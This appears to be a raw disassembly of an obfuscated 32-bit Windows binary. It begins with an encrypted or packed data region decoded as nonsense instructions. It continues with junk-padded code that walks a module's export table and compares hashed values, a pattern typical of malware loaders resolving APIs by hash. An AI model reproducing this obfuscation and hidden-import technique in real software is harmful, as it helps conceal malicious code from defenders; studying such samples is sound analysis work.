  40581c:	dec    edi
  40581d:	shl    DWORD PTR [esi+0x48],0x6a
  405821:	cld    
  405822:	int    0xd6
  405824:	imul   BYTE PTR [ecx]
  405826:	jno    0x405835
  405828:	pop    ebx
  405829:	das    
  40582a:	imul   ebp,DWORD PTR [esi+esi*4],0xffffffc3
  40582e:	xchg   edx,eax
  40582f:	push   cs
  405830:	dec    ecx
  405831:	in     al,dx
  405832:	pop    ebp
  405833:	inc    esi
  405834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405835:	add    ebx,DWORD PTR [edx-0x1babf88c]
  40583b:	lahf   
  40583c:	pop    esi
  40583d:	fst    DWORD PTR ds:0x8a710fd3
  405843:	sub    BYTE PTR [ebx+0x57],bh
  405846:	add    BYTE PTR ds:0x507d1ed0,ch
  40584c:	jo     0x4057ce
  40584e:	or     DWORD PTR [ecx+0xe],ebp
  405851:	push   es
  405852:	pop    ebp
  405853:	sub    esi,DWORD PTR [ecx+0x674cd144]
  405859:	js     0x4058da
  40585b:	out    0xcd,al
  40585d:	add    bl,bh
  40585f:	outs   dx,BYTE PTR ds:[esi]
  405860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405861:	sub    BYTE PTR [edi],cl
  405863:	test   BYTE PTR [ebp+0x3a],0x1b
  405867:	add    BYTE PTR [edx+0x368353d0],dh
  40586d:	aas    
  40586e:	push   edx
  40586f:	(bad)  
  405870:	enter  0x96e2,0x5e
  405874:	inc    ebp
  405875:	fadd   DWORD PTR [edi]
  405877:	mov    ds:0x99b70c0f,eax
  40587c:	jbe    0x4058c8
  40587e:	lods   eax,DWORD PTR ds:[esi]
  40587f:	mov    ebx,0x9a889a0b
  405884:	ja     0x40589e
  405886:	jmp    0x9e67:0xce3f3ddd
  40588d:	sbb    edx,DWORD PTR ds:0xd7f876dc
  405893:	dec    ecx
  405894:	push   esp
  405895:	data16 (bad) 
  405897:	daa    
  405898:	fs in  al,dx
  40589a:	test   al,0xa
  40589c:	pop    edx
  40589d:	hlt    
  40589e:	xchg   BYTE PTR [ebx+0x7d],dh
  4058a1:	js     0x40584a
  4058a3:	inc    ebx
  4058a4:	cli    
  4058a5:	xor    al,0xc2
  4058a7:	jne    0x4058d4
  4058a9:	(bad)  
  4058aa:	popf   
  4058ab:	dec    ebp
  4058ac:	cdq    
  4058ad:	push   0xc6378e98
  4058b2:	ficomp WORD PTR [edi+eiz*2-0x38ba8780]
  4058b9:	loopne 0x40588a
  4058bb:	idiv   BYTE PTR [edx+0xc]
  4058be:	pop    eax
  4058bf:	mov    edx,0x334abe33
  4058c5:	xchg   esp,eax
  4058c6:	cmp    dl,BYTE PTR [ebp-0x29]
  4058c9:	mov    ecx,0xbdc71a11
  4058ce:	data16 fcom st(5)
  4058d1:	jg     0x4058ad
  4058d3:	adc    DWORD PTR [ebp-0x5cf56419],ebp
  4058d9:	add    BYTE PTR [ebp+eiz*8+0x6e083573],bl
  4058e0:	loope  0x405877
  4058e2:	or     esp,esp
  4058e4:	call   0xfda373f5
  4058e9:	repz mov ss,edi
  4058ec:	loopne 0x40587f
  4058ee:	fmul   DWORD PTR [ebx-0x42]
  4058f1:	mov    ch,0x1b
  4058f3:	mov    eax,0x59d4eac1
  4058f8:	inc    esi
  4058f9:	mov    ch,dh
  4058fb:	(bad)  
  4058fd:	sar    DWORD PTR [edi+eiz*1+0x3f],cl
  405901:	les    edx,FWORD PTR [edi+0x817d12c]
  405907:	mov    DWORD PTR [edi+0x1d],ebp
  40590a:	and    eax,0xed08e3ed
  40590f:	or     BYTE PTR [edx+0x2c],cl
  405912:	pop    edx
  405913:	push   ds
  405914:	out    0x5f,eax
  405916:	(bad)  
  405918:	or     eax,0x329d4a9f
  40591d:	jo     0x40592f
  40591f:	inc    ecx
  405920:	push   0x4e2b4e54
  405925:	mov    ebx,0x31c41baf
  40592a:	idiv   esp
  40592c:	sub    al,0x7d
  40592e:	sub    eax,0x3706d777
  405933:	adc    ch,ah
  405935:	and    al,ch
  405937:	or     al,0x17
  405939:	ret    0xfe19
  40593c:	sbb    edi,esi
  40593e:	mov    es,ecx
  405940:	outs   dx,BYTE PTR ds:[esi]
  405941:	cmp    dh,dl
  405943:	pop    edx
  405944:	aad    0xc2
  405946:	loop   0x405980
  405948:	aaa    
  405949:	adc    DWORD PTR [esi-0x41],0x99a2d8c9
  405950:	sbb    BYTE PTR [edi],0x1b
  405953:	bound  edx,QWORD PTR [eax+0x25dc246]
  405959:	loopne 0x40590b
  40595b:	ret    0x4511
  40595e:	pop    ebp
  40595f:	push   eax
  405960:	sbb    DWORD PTR [edi],edi
  405962:	test   ah,bh
  405964:	fcmove st,st(1)
  405966:	dec    edi
  405967:	or     dl,al
  405969:	sub    BYTE PTR [esi-0x3d3a60a3],al
  40596f:	sbb    al,0xc
  405971:	cmp    esi,ebp
  405973:	repz fcomp DWORD PTR [eax-0x27277668]
  40597a:	dec    eax
  40597b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40597c:	clc    
  40597d:	push   0x747683ea
  405982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405983:	push   ds
  405984:	sub    al,0xc
  405986:	in     eax,dx
  405987:	rol    BYTE PTR [esi],1
  405989:	jg     0x40594e
  40598b:	cmp    al,0x20
  40598d:	cmp    eax,0x2c600872
  405992:	adc    al,0xeb
  405994:	cs jecxz 0x405998
  405997:	mov    WORD PTR [esi-0x79fd2d26],fs
  40599d:	cmp    esp,DWORD PTR [esi+0x4b]
  4059a0:	icebp  
  4059a1:	sub    BYTE PTR [edi+0x4d],0x66
  4059a5:	xor    ebx,esi
  4059a7:	add    BYTE PTR [ebx],0xe2
  4059aa:	aas    
  4059ab:	call   0x545e26c3
  4059b0:	ins    DWORD PTR es:[edi],dx
  4059b1:	leave  
  4059b2:	scas   al,BYTE PTR es:[edi]
  4059b3:	js     0x405a17
  4059b5:	out    0x8b,al
  4059b7:	adc    al,0x70
  4059b9:	mov    edx,0xdc39fb6d
  4059be:	jo     0x405a09
  4059c0:	shl    BYTE PTR [esi],1
  4059c2:	mov    DWORD PTR [eax+0xf],edx
  4059c5:	and    eax,DWORD PTR [ebx+ebp*4]
  4059c8:	loop   0x405a12
  4059ca:	push   cs
  4059cb:	add    DWORD PTR [ebp+0xa],eax
  4059ce:	and    bl,BYTE PTR [ecx-0x3c]
  4059d1:	and    ebp,0xa2307a62
  4059d7:	iret   
  4059d8:	vcvtsi2ss xmm6,xmm7,DWORD PTR [edx]
  4059dc:	or     al,0x6a
  4059de:	cs lahf 
  4059e0:	add    DWORD PTR [eax-0x3d],0xffffffe9
  4059e4:	mov    bl,0x20
  4059e6:	std    
  4059e7:	sub    al,0x5c
  4059e9:	push   esi
  4059ea:	dec    eax
  4059eb:	fsub   st,st(0)
  4059ed:	sub    al,0x65
  4059ef:	aas    
  4059f0:	sar    BYTE PTR [edx+0x72],0x59
  4059f4:	xchg   ebx,eax
  4059f5:	test   DWORD PTR [ecx-0x2ab02456],edi
  4059fb:	(bad)  
  4059fd:	mov    eax,ds:0x8f6d548f
  405a02:	push   esi
  405a03:	fstp   TBYTE PTR [ecx]
  405a05:	int3   
  405a06:	imul   ebp,DWORD PTR [edx+0x557911e8],0x26
  405a0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a0e:	lahf   
  405a0f:	cmp    ah,cl
  405a11:	fsubr  QWORD PTR [ecx-0x3074ea48]
  405a17:	popf   
  405a18:	fistp  QWORD PTR [edi+0x6]
  405a1b:	push   edx
  405a1c:	mov    dl,bl
  405a1e:	ret    0x264c
  405a21:	fcmove st,st(5)
  405a23:	pop    esi
  405a24:	jmp    0x301255c0
  405a29:	jmp    0x930b:0xb8903a2f
  405a30:	adc    al,al
  405a32:	in     al,dx
  405a33:	dec    edi
  405a34:	hlt    
  405a35:	rcl    BYTE PTR [eax-0xc7a825a],cl
  405a3b:	and    eax,0xaf21d5f8
  405a40:	shl    ebx,0x62
  405a43:	inc    ebx
  405a44:	xchg   ebx,eax
  405a45:	aaa    
  405a46:	enter  0xe614,0x67
  405a4a:	sub    dl,al
  405a4c:	out    0xc9,eax
  405a4e:	ret    
  405a4f:	stos   BYTE PTR es:[edi],al
  405a50:	fld    DWORD PTR [ecx+ecx*4]
  405a53:	mov    bl,0x5a
  405a55:	retf   0x81fe
  405a58:	mov    al,0x29
  405a5a:	pop    ss
  405a5b:	jb     0x405a30
  405a5d:	ss enter 0xe5a,0x14
  405a62:	mov    eax,0x1aecd2eb
  405a67:	sbb    dl,ah
  405a69:	scas   al,BYTE PTR es:[edi]
  405a6a:	or     eax,0xb17da148
  405a6f:	mov    dl,0x37
  405a71:	icebp  
  405a72:	(bad)  
  405a73:	add    BYTE PTR [eax+0x1a14eda8],bl
  405a79:	mov    ebp,0x92ad3d45
  405a7e:	std    
  405a7f:	pop    es
  405a80:	push   0x98c48e7f
  405a85:	mov    ebx,0x5389b97
  405a8a:	adc    edx,DWORD PTR [esi]
  405a8c:	xchg   ecx,eax
  405a8d:	mov    ah,0x17
  405a8f:	rol    DWORD PTR [eax+0x640bfb45],0x68
  405a96:	dec    edi
  405a97:	push   edi
  405a98:	pushf  
  405a99:	adc    al,0x79
  405a9b:	scas   eax,DWORD PTR es:[edi]
  405a9c:	dec    ebx
  405a9d:	mov    edi,0xc8df17b7
  405aa2:	ja     0x405a8e
  405aa4:	cs (bad) 
  405aa6:	fdivr  QWORD PTR [edx-0x5a4535ca]
  405aac:	mov    esp,0x7fc6f0a1
  405ab1:	add    BYTE PTR [ecx+0x42],ch
  405ab4:	gs jmp 0xc3c7:0xad207d00
  405abc:	inc    edi
  405abd:	mov    edx,0x9f7b4fe4
  405ac2:	fst    QWORD PTR [ebx+0x5d]
  405ac5:	push   edx
  405ac6:	xchg   BYTE PTR [ebp+0x0],ah
  405ac9:	in     eax,dx
  405aca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405acb:	int3   
  405acc:	push   edi
  405acd:	jmp    0x20c2:0x656f3656
  405ad4:	ficom  DWORD PTR [esi+0x71]
  405ad7:	and    DWORD PTR [esi+edi*4-0x27],ecx
  405adb:	dec    edi
  405adc:	inc    ecx
  405add:	stc    
  405ade:	loop   0x405b2f
  405ae0:	adc    BYTE PTR [edx],dl
  405ae2:	mov    ?,ebp
  405ae4:	outs   dx,DWORD PTR ds:[esi]
  405ae5:	mov    ecx,0x2095aef
  405aea:	call   DWORD PTR [edi]
  405aec:	or     edx,DWORD PTR [edx+0x227077b5]
  405af2:	data16 in al,0xe2
  405af5:	xchg   esi,eax
  405af6:	pop    ds
  405af7:	sub    eax,DWORD PTR [ebp+0x7f7b9eaa]
  405afd:	(bad)  
  405aff:	push   eax
  405b00:	jnp    0x405aa5
  405b02:	sbb    al,bl
  405b04:	mov    eax,ds:0x59f18f01
  405b09:	(bad)  
  405b0b:	pop    DWORD PTR ds:0xc7545de8
  405b11:	clc    
  405b12:	dec    ebx
  405b13:	xor    BYTE PTR [ebx-0x20],0xca
  405b17:	imul   ebx,eax,0xf4f7576a
  405b1d:	mov    ds:0xb088c2a4,al
  405b22:	popa   
  405b23:	dec    edx
  405b24:	ud1    eax,DWORD PTR [edi-0x55c00400]
  405b2b:	and    bl,dl
  405b2d:	call   0x3bba:0xe2e58528
  405b34:	sbb    DWORD PTR [esi-0x4626405d],0xad3862f9
  405b3e:	mov    dl,0xc7
  405b40:	add    DWORD PTR [ecx-0x2c4251f9],esi
  405b46:	ret    
  405b47:	sti    
  405b48:	jmpw   0x167e
  405b4c:	shl    BYTE PTR ds:0x5ba57e6d,0x8d
  405b53:	(bad)
  405b58:	and    al,0x29
  405b5a:	mov    dl,0x3b
  405b5c:	fwait
  405b5d:	mov    ah,0x4d
  405b5f:	(bad)  
  405b60:	into   
  405b61:	mov    edx,fs
  405b63:	aas    
  405b64:	jl     0x405b7c
  405b66:	push   ebp
  405b67:	pop    ds
  405b68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b69:	lods   eax,DWORD PTR ds:[esi]
  405b6a:	sub    ch,BYTE PTR [eax]
  405b6c:	adc    eax,0xba962c70
  405b71:	(bad)  
  405b73:	xchg   ch,ch
  405b75:	std    
  405b76:	retf   
  405b77:	add    DWORD PTR ds:0xaa097c04,ecx
  405b7d:	gs jmp 0x405beb
  405b80:	daa    
  405b81:	adc    al,0x89
  405b83:	loope  0x405b91
  405b85:	test   BYTE PTR [ebx+0x5a],bh
  405b88:	mov    esp,0xf9467af6
  405b8d:	or     BYTE PTR [ecx-0x3a],bh
  405b90:	leave  
  405b91:	add    ecx,ecx
  405b93:	mov    edx,0x1cbcf589
  405b98:	lds    ecx,FWORD PTR [eax]
  405b9a:	sti    
  405b9b:	push   ecx
  405b9c:	loop   0x405b47
  405b9e:	add    al,0x2d
  405ba0:	scas   eax,DWORD PTR es:[edi]
  405ba1:	mov    bh,0x6d
  405ba3:	cmp    BYTE PTR [edx+0x27],dh
  405ba6:	bound  ecx,QWORD PTR [eax+ebx*1]
  405ba9:	inc    ebx
  405baa:	inc    esp
  405bab:	add    DWORD PTR [eax+0x55fc59d4],esp
  405bb1:	mov    edi,0x3a2f1f4b
  405bb6:	lahf   
  405bb7:	out    dx,al
  405bb8:	rol    eax,1
  405bba:	mov    ah,0x4f
  405bbc:	jb     0x405b5d
  405bbe:	stc    
  405bbf:	pop    ebp
  405bc0:	(bad)  
  405bc1:	popa   
  405bc2:	jecxz  0x405c37
  405bc4:	push   ds
  405bc5:	imul   ebx,DWORD PTR [ecx+ebp*4],0x1b08bed7
  405bcc:	pusha  
  405bcd:	sti    
  405bce:	inc    eax
  405bcf:	in     eax,0xce
  405bd1:	cwde   
  405bd2:	mov    edi,0x279d960e
  405bd7:	xor    ch,BYTE PTR [ebx-0x7d83af08]
  405bdd:	clc    
  405bde:	ror    DWORD PTR [ebp+0x49],0x6f
  405be2:	add    al,0xa9
  405be4:	pusha  
  405be5:	repz addr16 xor eax,0x39998d01
  405bec:	adc    eax,0x24febb40
  405bf1:	fadd   QWORD PTR [ecx-0x1e]
  405bf4:	push   edx
  405bf5:	mov    eax,0x16e4546f
  405bfa:	rcr    DWORD PTR [eax-0x72fe9c1c],1
  405c00:	mov    eax,ds:0x67780008
  405c05:	jbe    0x405b9b
  405c07:	xor    bl,bl
  405c09:	outs   dx,BYTE PTR ds:[si]
  405c0b:	adc    DWORD PTR [esi+0x26],ecx
  405c0e:	xor    eax,0x90301bc4
  405c13:	fidivr WORD PTR [edx]
  405c15:	icebp  
  405c16:	test   DWORD PTR [edx+0x37cefb68],eax
  405c1c:	mov    ch,0xda
  405c1e:	push   ebp
  405c1f:	push   ebp
  405c20:	push   ds
  405c21:	loope  0x405bc2
  405c23:	in     eax,0x28
  405c25:	(bad)
  405c28:	cmp    ah,cl
  405c2a:	pop    eax
  405c2b:	sbb    al,0x65
  405c2d:	fcmovnb st,st(0)
  405c2f:	and    dh,dl
  405c31:	mov    eax,0x3265a788
  405c36:	add    ebp,0xb0f596bf
  405c3c:	out    0x49,eax
  405c3e:	(bad)  
  405c3f:	call   0x7eb5692f
  405c44:	dec    ebx
  405c45:	mov    cl,0xd3
  405c47:	rcl    DWORD PTR [eax],0x8d
  405c4a:	mov    eax,ds:0x421a92
  405c4f:	push   DWORD PTR [eax]
  405c51:	push   DWORD PTR ds:0x421cee
  405c57:	push   DWORD PTR ds:0x421a9a
  405c5d:	push   DWORD PTR ds:0x421cce
  405c63:	push   DWORD PTR ds:0x421d62
  405c69:	push   DWORD PTR [ebp-0x30]
  405c6c:	push   DWORD PTR [ebp-0x20]
  405c6f:	mov    eax,DWORD PTR [ebp-0x8]
  405c72:	mov    eax,DWORD PTR [eax]
  405c74:	mov    eax,DWORD PTR [eax]
  405c76:	mov    eax,DWORD PTR [eax]
  405c78:	call   eax
  405c7a:	mov    eax,DWORD PTR [ebp-0x34]
  405c7d:	mov    ecx,DWORD PTR ds:0x421c92
  405c83:	add    DWORD PTR [eax],ecx
  405c85:	pop    edi
  405c86:	pop    esi
  405c87:	leave  
  405c88:	ret    
  405c89:	push   ebp
  405c8a:	mov    ebp,esp
  405c8c:	sub    esp,0x58
  405c8f:	add    DWORD PTR ds:0x429008,0x42b004
  405c99:	push   ebx
  405c9a:	adc    DWORD PTR ds:0x42a018,0x429010
  405ca4:	push   esi
  405ca5:	push   edi
  405ca6:	and    DWORD PTR ds:0x42c00c,0x6433
  405cb0:	push   0x1f
  405cb2:	lea    eax,[ebp-0x58]
  405cb5:	push   eax
  405cb6:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405cc0:	push   0x0
  405cc2:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405ccc:	call   DWORD PTR ds:0x424034
  405cd2:	call   DWORD PTR ds:0x424004
  405cd8:	and    DWORD PTR ds:0x42a000,0x4473
  405ce2:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ce9:	and    DWORD PTR ds:0x429018,0x0
  405cf3:	mov    ebx,DWORD PTR ds:0x429018
  405cf9:	inc    ebx
  405cfa:	mov    DWORD PTR ds:0x429018,ebx
  405d00:	cmp    DWORD PTR ds:0x429018,0x1f
  405d07:	jne    0x405d1d
  405d0d:	push   0x42b00c
  405d12:	push   0x7f05
  405d17:	call   DWORD PTR ds:0x42403c
  405d1d:	cmp    DWORD PTR ds:0x429018,0x19
  405d24:	jb     0x405cf3
  405d2a:	add    ebx,DWORD PTR ds:0x42a008
  405d30:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d37:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3a:	mov    ebx,0x7510893
  405d3f:	xor    ecx,ebx
  405d41:	or     DWORD PTR ds:0x42b00c,edx
  405d47:	mov    eax,0x3272db
  405d4c:	add    ecx,eax
  405d4e:	sub    DWORD PTR ds:0x42a010,0x429004
  405d58:	mov    DWORD PTR [ebp-0x1c],ecx
  405d5b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d5e:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d68:	test   ecx,ecx
  405d6a:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d74:	je     0x405d92
  405d7a:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d84:	mov    ecx,DWORD PTR [ebp+0x14]
  405d87:	mov    ecx,DWORD PTR [ecx]
  405d89:	add    DWORD PTR ds:0x42a000,ecx
  405d8f:	mov    DWORD PTR [ebp-0x1c],ecx
  405d92:	and    DWORD PTR ds:0x42a010,0x0
  405d9c:	mov    edi,DWORD PTR ds:0x42a010
  405da2:	inc    edi
  405da3:	mov    DWORD PTR ds:0x42a010,edi
  405da9:	cmp    DWORD PTR ds:0x42a010,0x9
  405db0:	jne    0x405dc4
  405db6:	push   DWORD PTR [ebp-0x14]
  405db9:	push   0x423877
  405dbe:	call   DWORD PTR ds:0x424040
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x8
  405dcb:	jne    0x405dde
  405dd1:	mov    edi,DWORD PTR ds:0x42a010
  405dd7:	inc    edi
  405dd8:	mov    DWORD PTR ds:0x42a010,edi
  405dde:	cmp    DWORD PTR ds:0x42a010,0x13
  405de5:	jb     0x405d9c
  405deb:	mov    ecx,0x457a
  405df0:	imul   edx,eax
  405df3:	mov    esi,0x787f
  405df8:	or     DWORD PTR ds:0x428004,0x4238
  405e02:	add    edx,ecx
  405e04:	sbb    DWORD PTR ds:0x429014,0x4641
  405e0e:	xchg   esi,ecx
  405e10:	xor    DWORD PTR ds:0x42801c,edi
  405e16:	mov    edi,0x155c
  405e1b:	sub    edx,edi
  405e1d:	and    DWORD PTR ds:0x42901c,0x60c1
  405e27:	mov    ecx,DWORD PTR [ebp-0x4]
  405e2a:	xor    ecx,ebx
  405e2c:	and    DWORD PTR ds:0x42b014,0x0
  405e36:	mov    esi,DWORD PTR ds:0x42b014
  405e3c:	inc    esi
  405e3d:	mov    DWORD PTR ds:0x42b014,esi
  405e43:	cmp    DWORD PTR ds:0x42b014,0x10
  405e4a:	jne    0x405e5b
  405e50:	push   0x423836
  405e55:	call   DWORD PTR ds:0x424044
  405e5b:	cmp    DWORD PTR ds:0x42b014,0xf
  405e62:	jne    0x405e75
  405e68:	mov    esi,DWORD PTR ds:0x42b014
  405e6e:	inc    esi
  405e6f:	mov    DWORD PTR ds:0x42b014,esi
  405e75:	cmp    DWORD PTR ds:0x42b014,0x1b
  405e7c:	jb     0x405e36
  405e82:	add    ecx,eax
  405e84:	sbb    esi,0x766b
  405e8a:	mov    DWORD PTR [ebp-0x8],ecx
  405e8d:	and    esi,0x21f
  405e93:	mov    ecx,DWORD PTR [ebp-0x14]
  405e96:	mov    DWORD PTR ds:0x42b000,0x19
  405ea0:	cmp    DWORD PTR ds:0x42b000,0x0
  405ea7:	je     0x405f01
  405ead:	cmp    DWORD PTR ds:0x42b000,0x4
  405eb4:	jne    0x405ecd
  405eba:	push   DWORD PTR [ebp-0x1c]
  405ebd:	push   0x429018
  405ec2:	push   0x423aa2
  405ec7:	call   DWORD PTR ds:0x424048
  405ecd:	cmp    DWORD PTR ds:0x42b000,0x5
  405ed4:	jne    0x405ee7
  405eda:	mov    esi,DWORD PTR ds:0x42b000
  405ee0:	dec    esi
  405ee1:	mov    DWORD PTR ds:0x42b000,esi
  405ee7:	xor    esi,esi
  405ee9:	add    esi,DWORD PTR ds:0x42b000
  405eef:	dec    esi
  405ef0:	mov    DWORD PTR ds:0x42b000,esi
  405ef6:	jmp    0x405ea0
  405efb:	and    esi,0x686c
  405f01:	xor    ecx,ebx
  405f03:	add    ecx,eax
  405f05:	mov    DWORD PTR [ebp-0x24],ecx
  405f08:	adc    esi,ecx
  405f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  405f0d:	and    DWORD PTR ds:0x428014,0x0
  405f17:	jmp    0x405f29
  405f1c:	mov    esi,DWORD PTR ds:0x428014
  405f22:	inc    esi
  405f23:	mov    DWORD PTR ds:0x428014,esi
  405f29:	cmp    DWORD PTR ds:0x428014,0x14
  405f30:	jae    0x405f5c
  405f36:	cmp    DWORD PTR ds:0x428014,0x1d
  405f3d:	jne    0x405f51
  405f43:	push   0x42b01c
  405f48:	push   DWORD PTR [ebp-0xc]
  405f4b:	call   DWORD PTR ds:0x424014
  405f51:	jmp    0x405f1c
  405f56:	xor    DWORD PTR ds:0x428018,ecx
  405f5c:	xor    ecx,ebx
  405f5e:	add    ecx,eax
  405f60:	add    DWORD PTR ds:0x428004,edx
  405f66:	mov    DWORD PTR [ebp-0x30],ecx
  405f69:	adc    DWORD PTR ds:0x42b01c,edi
  405f6f:	mov    esi,DWORD PTR [ebp-0x4]
  405f72:	xor    DWORD PTR ds:0x42800c,0x2f0f
  405f7c:	xor    esi,ebx
  405f7e:	and    DWORD PTR ds:0x429018,0x0
  405f88:	mov    ecx,DWORD PTR ds:0x429018
  405f8e:	inc    ecx
  405f8f:	mov    DWORD PTR ds:0x429018,ecx
  405f95:	cmp    DWORD PTR ds:0x429018,0x13
  405f9c:	jne    0x405fca
  405fa2:	push   DWORD PTR [ebp-0x18]
  405fa5:	push   0x42b018
  405faa:	push   0x8bc1
  405faf:	push   0x42a018
  405fb4:	push   0x81c2
  405fb9:	push   DWORD PTR [ebp-0x18]
  405fbc:	push   0x8630
  405fc1:	push   DWORD PTR [ebp-0x28]
  405fc4:	call   DWORD PTR ds:0x424018
  405fca:	cmp    DWORD PTR ds:0x429018,0x10
  405fd1:	jb     0x405f88
  405fd7:	movzx  ecx,WORD PTR ds:0x429008
  405fde:	sub    ecx,DWORD PTR ds:0x42a010
  405fe4:	mov    DWORD PTR ds:0x429008,ecx
  405fea:	add    esi,eax
  405fec:	mov    ecx,DWORD PTR [ebp-0x24]
  405fef:	sub    ecx,eax
  405ff1:	lea    edx,[esi-0x3272db]
  405ff7:	xor    DWORD PTR ds:0x428008,0x428000
  406001:	xor    ecx,ebx
  406003:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40600d:	xor    edx,ebx
  40600f:	cmp    edx,ecx
  406011:	mov    DWORD PTR ds:0x428000,0x76f
  40601b:	je     0x4062a3
  406021:	xor    DWORD PTR ds:0x42c010,edx
  406027:	mov    ecx,DWORD PTR [ebp-0x4]
  40602a:	xor    ecx,ebx
  40602c:	or     DWORD PTR ds:0x429014,0x42a01c
  406036:	add    ecx,eax
  406038:	cmp    esi,ecx
  40603a:	mov    DWORD PTR ds:0x42a01c,0x739d
  406044:	jne    0x406280
  40604a:	add    DWORD PTR ds:0x42a00c,0x429004
  406054:	push   DWORD PTR [ebp+0x8]
  406057:	call   0x413c14
  40605c:	mov    DWORD PTR [ebp-0x18],eax
  40605f:	mov    eax,DWORD PTR [ebp-0x4]
  406062:	mov    DWORD PTR ds:0x42c00c,0x1d
  40606c:	cmp    DWORD PTR ds:0x42c00c,0x0
  406073:	je     0x4060a7
  406079:	cmp    DWORD PTR ds:0x42c00c,0x21
  406080:	jne    0x40608f
  406086:	push   DWORD PTR [ebp-0xc]
  406089:	call   DWORD PTR ds:0x42401c
  40608f:	mov    edi,DWORD PTR ds:0x42c00c
  406095:	dec    edi
  406096:	mov    DWORD PTR ds:0x42c00c,edi
  40609c:	jmp    0x40606c
  4060a1:	adc    ecx,DWORD PTR ds:0x428008
  4060a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4060aa:	and    DWORD PTR ds:0x42b01c,0x0
  4060b4:	mov    edi,DWORD PTR ds:0x42b01c
  4060ba:	inc    edi
  4060bb:	mov    DWORD PTR ds:0x42b01c,edi
  4060c1:	cmp    DWORD PTR ds:0x42b01c,0x23
  4060c8:	jne    0x4060da
  4060ce:	push   DWORD PTR [ebp-0x14]
  4060d1:	push   DWORD PTR [ebp-0x28]
  4060d4:	call   DWORD PTR ds:0x424020
  4060da:	cmp    DWORD PTR ds:0x42b01c,0x19
  4060e1:	jb     0x4060b4
  4060e7:	xor    eax,ebx
  4060e9:	add    DWORD PTR ds:0x429018,0x397c
  4060f3:	mov    edi,0x3272db
  4060f8:	sub    DWORD PTR ds:0x428020,0x386b
  406102:	add    eax,edi
  406104:	mov    DWORD PTR ds:0x42900c,0x67dc
  40610e:	cmp    ecx,eax
  406110:	mov    DWORD PTR ds:0x42c00c,0x661b
  40611a:	je     0x406313
  406120:	push   DWORD PTR [ebp-0x18]
  406123:	sub    DWORD PTR ds:0x42800c,0x42a014
  40612d:	push   DWORD PTR [ebp+0x8]
  406130:	and    DWORD PTR ds:0x42b000,0x429010
  40613a:	call   0x41b72b
  40613f:	sub    ecx,DWORD PTR ds:0x42a00c
  406145:	mov    DWORD PTR [ebp-0x18],eax
  406148:	xor    eax,eax
  40614a:	xor    eax,DWORD PTR ds:0x42a01c
  406150:	xor    DWORD PTR ds:0x428018,eax
  406156:	mov    eax,DWORD PTR [ebp-0x4]
  406159:	mov    ecx,DWORD PTR [ebp-0x18]
  40615c:	xor    eax,ebx
  40615e:	add    eax,edi
  406160:	cmp    ecx,eax
  406162:	je     0x406313
  406168:	mov    ecx,DWORD PTR ds:0x429010
  40616e:	add    DWORD PTR ds:0x42a010,ecx
  406174:	mov    eax,DWORD PTR [ebp-0x18]
  406177:	and    DWORD PTR ds:0x42a008,0x0
  406181:	jmp    0x406193
  406186:	mov    ecx,DWORD PTR ds:0x42a008
  40618c:	inc    ecx
  40618d:	mov    DWORD PTR ds:0x42a008,ecx
  406193:	cmp    DWORD PTR ds:0x42a008,0x14
  40619a:	jae    0x40621e
  4061a0:	cmp    DWORD PTR ds:0x42a008,0x1f
  4061a7:	jne    0x4061d5
  4061ad:	push   0x42b010
  4061b2:	push   DWORD PTR [ebp-0x10]
  4061b5:	push   0x4f72
  4061ba:	push   0x42900c
  4061bf:	push   DWORD PTR [ebp-0x24]
  4061c2:	push   0x4239c2
  4061c7:	push   DWORD PTR [ebp-0x1c]
  4061ca:	push   0x3544
  4061cf:	call   DWORD PTR ds:0x424024
  4061d5:	jmp    0x406186
  4061da:	and    DWORD PTR ds:0x428020,0x0
  4061e4:	mov    ecx,DWORD PTR ds:0x428020
  4061ea:	inc    ecx
  4061eb:	mov    DWORD PTR ds:0x428020,ecx
  4061f1:	cmp    DWORD PTR ds:0x428020,0x1a
  4061f8:	jne    0x406211
  4061fe:	push   DWORD PTR [ebp-0x1c]
  406201:	push   0x561b
  406206:	push   0x3276
  40620b:	call   DWORD PTR ds:0x424028
  406211:	cmp    DWORD PTR ds:0x428020,0x17
  406218:	jb     0x4061e4
  40621e:	mov    eax,DWORD PTR [eax+0x18]
  406221:	mov    DWORD PTR [ebp-0x24],eax
  406224:	xor    eax,eax
  406226:	mov    eax,DWORD PTR [ebp-0x18]
  406229:	mov    ecx,DWORD PTR [ebp+0x8]
  40622c:	add    DWORD PTR ds:0x42901c,0x480
  406236:	add    ecx,DWORD PTR [eax+0x20]
  406239:	mov    DWORD PTR [ebp-0x2c],ecx
  40623c:	sub    DWORD PTR ds:0x42c00c,ebx
  406242:	mov    eax,DWORD PTR [ebp-0x18]
  406245:	mov    ecx,DWORD PTR [ebp+0x8]
  406248:	add    DWORD PTR ds:0x42a004,0x42a01c
  406252:	add    ecx,DWORD PTR [eax+0x24]
  406255:	mov    DWORD PTR [ebp-0x34],ecx
  406258:	inc    ecx
  406259:	mov    eax,DWORD PTR [ebp-0x18]
  40625c:	sub    DWORD PTR ds:0x42b010,0x20b8
  406266:	mov    ecx,DWORD PTR [ebp+0x8]
  406269:	or     DWORD PTR ds:0x42a010,0x1874
  406273:	add    ecx,DWORD PTR [eax+0x1c]
  406276:	mov    eax,edi
  406278:	mov    DWORD PTR [ebp-0x18],ecx
  40627b:	jmp    0x4062db
  406280:	mov    ecx,DWORD PTR [ebp-0x2c]
  406283:	mov    edx,DWORD PTR [ebp+0x8]
